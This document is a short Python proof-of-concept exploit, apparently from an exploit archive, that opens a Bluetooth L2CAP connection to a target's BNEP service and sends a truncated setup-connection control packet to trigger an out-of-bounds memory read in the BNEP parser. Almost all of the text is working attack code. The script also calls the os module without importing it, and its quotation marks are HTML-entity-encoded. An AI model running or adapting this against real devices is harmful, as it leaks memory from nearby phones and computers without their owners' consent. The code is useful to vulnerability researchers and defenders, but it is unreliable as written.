import sys
import struct
 
import bluetooth
 
 
BNEP_PSM = 15
BNEP_FRAME_CONTROL = 0x01
 
# Control types (parsed by bnep_process_control_packet() in bnep_utils.cc)
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01
 
 
def oob_read(src_bdaddr, dst):
 
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.settimeout(5)
    bnep.bind((src_bdaddr, 0))
    print &#039;Connecting to BNEP...&#039;
    bnep.connect((dst, BNEP_PSM))
    bnep.settimeout(1)
    print "Triggering OOB read (you may need a debugger to verify that it&#039;s actually happening)..."
 
    # This crafted BNEP packet just contains the BNEP_FRAME_CONTROL frame type,
    # plus the BNEP_SETUP_CONNECTION_REQUEST_MSG control type.
    # It doesn&#039;t include the &#039;len&#039; field, therefore it is read from out of bounds
    bnep.send(struct.pack(&#039;<BB&#039;, BNEP_FRAME_CONTROL, BNEP_SETUP_CONNECTION_REQUEST_MSG))
    try:
        data = bnep.recv(3)
    except bluetooth.btcommon.BluetoothError:
        data = &#039;&#039;
 
    if data:
        print &#039;%r&#039; % data
    else:
        print &#039;[No data]&#039;
 
    print &#039;Closing connection.&#039;
    bnep.close()
 
 
def main(src_hci, dst):
    os.system(&#039;hciconfig %s sspmode 0&#039; % (src_hci,))
    os.system(&#039;hcitool dc %s&#039; % (dst,))
 
    oob_read(src_hci, dst)
 
 
if __name__ == &#039;__main__&#039;:
    if len(sys.argv) < 3:
        print(&#039;Usage: python bnep02.py <src-bdaddr> <dst-bdaddr>&#039;)
    else:
        if os.getuid():
            print &#039;Error: This script must be run as root.&#039;
        else:
            main(sys.argv[1], sys.argv[2])

